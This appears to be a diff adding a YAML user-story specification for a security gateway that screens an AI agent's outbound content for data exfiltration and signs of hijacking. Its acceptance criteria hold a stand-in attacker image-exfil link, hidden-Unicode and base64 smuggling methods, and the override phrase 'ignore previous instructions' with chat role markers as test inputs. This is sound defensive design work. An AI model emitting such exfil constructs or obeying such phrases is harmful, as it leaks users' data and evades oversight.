@@ -1,0 +1,84 @@
+# ─── Identity ───────────────────────────────────────────────
+id: M9-OUT-003
+domain: Security Gateway
+actor: CLIENT
+priority: P0
+components:
+  - gateway
+
+# ─── Intent ─────────────────────────────────────────────────
+story: >
+  As the security gateway, I want to catch outbound data-exfiltration vectors — invisible
+  characters, encoded payloads, zero-click image-exfil URLs, and leaked injection artifacts —
+  so that a compromised agent cannot smuggle data out or signal that it was hijacked, while
+  ordinary links still go through.
+
+# ─── Behavior (EARS) ───────────────────────────────────────
+behavior:
+  - trigger: "When outbound content is screened"
+    action: "the gateway shall strip invisible/smuggled Unicode on egress, flag high-entropy
+      encoded payloads, and match the zero-click image-exfil pattern (an image whose URL
+      carries data)"
+  - trigger: "When the outbound content contains injection artifacts in its body (role markers
+      / override phrases that indicate the agent's own output was hijacked)"
+    action: "the gateway shall produce a block verdict — this output is treated as
+      attacker-controlled"
+  - trigger: "When the content contains an ordinary hyperlink or image with no data-carrying
+      URL"
+    action: "the gateway shall let it pass"
+
+# ─── Acceptance Criteria ────────────────────────────────────
+acceptance_criteria:
+  - id: AC-001
+    given: "outbound text with data hidden in Unicode Tags-block / zero-width characters"
+    when: "the gateway screens it on egress"
+    then: "the emitted content contains none of those codepoints — a compromised agent cannot
+      smuggle data out invisibly"
+    test_type: unit
+    component_under_test: gateway
+
+  - id: AC-002
+    given: "outbound text containing a zero-click image-exfil construct
+      (`![x](https://attacker/?d=<data>)`)"
+    when: "the gateway screens it"
+    then: "the data-carrying image URL is flagged/stripped, while a separate ordinary link in
+      the same message passes unchanged"
+    test_type: unit
+    component_under_test: gateway
+
+  - id: AC-003
+    given: "outbound text containing injection artifacts in the body (`[SYSTEM]`,
+      `<|im_start|>`, an embedded \"ignore previous instructions\")"
+    when: "the gateway screens it"
+    then: "a block verdict is produced — the message is not sent, because its output indicates
+      the agent was hijacked"
+    test_type: unit
+    component_under_test: gateway
+
+# ─── Security Invariants ───────────────────────────────────
+security_invariants:
+  - id: SI-001
+    statement: "the gateway shall not emit outbound content carrying an invisible-Unicode or
+      encoded exfiltration payload"
+    adversarial_condition: "even when the payload is split across runs or base64-wrapped to
+      look like a normal token — egress stripping + the encoded-payload entropy check both run,
+      and the emitted bytes are checked clean"
+    test_type: unit
+    component_under_test: gateway
+
+# ─── References ─────────────────────────────────────────────
+references:
+  protocol_map: "Security and Prompt Injection Defense"
+  end_to_end_flow: "§7.1"
+  discussion_logs:
+    - "2026-05-28_1000_security-layer-v3-extensibility-and-split-gateway"
+  attack_corpus: "docs/planning/user-stories/m9/attack-corpus-reference.md"
+
+# ─── Implementation notes ──────────────────────────────────
+implementation_notes: >
+  Outbound exfiltration (M9-DEFINITION-OF-DONE Phase 1). The URL/markdown/image exfil set is
+  well-specified; prefer a URL domain allowlist over blunt pattern-blocking where practical.
+  Invisible-Unicode egress is symmetric with the inbound strip (M9-IN-001) — a compromised LOCAL
+  agent must not smuggle data out. Injection-artifacts-in-output is one of the few BLOCK cases
+  (a compromise signal), distinct from M9-IN-002 which scans INbound. The block/strip reaching
+  (or not reaching) the peer is the gate (M9-GATE-1 AC-002).
